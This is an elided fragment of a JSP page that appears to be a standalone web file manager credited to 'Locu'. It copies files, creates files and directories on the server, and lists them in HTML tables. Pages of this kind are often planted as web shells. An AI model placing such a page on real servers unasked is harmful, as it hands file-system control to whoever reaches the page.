...
String[] authorInfo={" <font color=red> Locu - - by me</font>"," <font color=red>  </font>"};
...
if(strAction!=null && strAction.equals("savecopy"))
{
	...
	{
		sbSaveCopy.append("<p><font color=red>save1。</font>");
	}
	else
	{
		...
		if(f_des.isFile())
		{
			sbSaveCopy.append("<p><font color=red>svae2。</font>");
		}
		else
		{
...
if(strAction!=null && strAction.equals("newFile"))
{
	...
	{		
			...
			if(strType.equals("File") && !f_new.createNewFile())
				sbNewFile.append(strF+" newfile");
			if(strType.equals("Dir") && !f_new.mkdirs())
				sbNewFile.append(strF+" newdir");
	}
	else
	{
		sbNewFile.append("<p><font color=red>newfile。</font>");
	}
}
...
{
	out.println("<font color=red>err： "+e.toString()+"</font>");
}
%>
...
<table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">
	...
	%>
		<span id="EditBox"><table width="98%" border="1" cellspacing="1" cellpadding="4" bordercolorlight="#cccccc" bordercolordark="#FFFFFF" bgcolor="white" >
            ...
            <%=sbFile%>
             <!-- <tr align="center"> 
                <td colspan="4"><br>
                  总计文件个数：<font color="#FF0000">30</font> ，bigshort：<font color="#FF0000">664.9</font> 
                  KB </td>
              </tr>
			 -->
            </table>
	...
	<input type="submit" name="btnNewFile" value="btnNewFile" onclick="frmMake.submit()" > 
	<input type="submit" name="btnNewDir" value="btnNewDir"  onclick="frmMake.submit()" > 
	</form>		
...
<br><br>
<center>Locu</a> ,All Rights Reserved.
<br>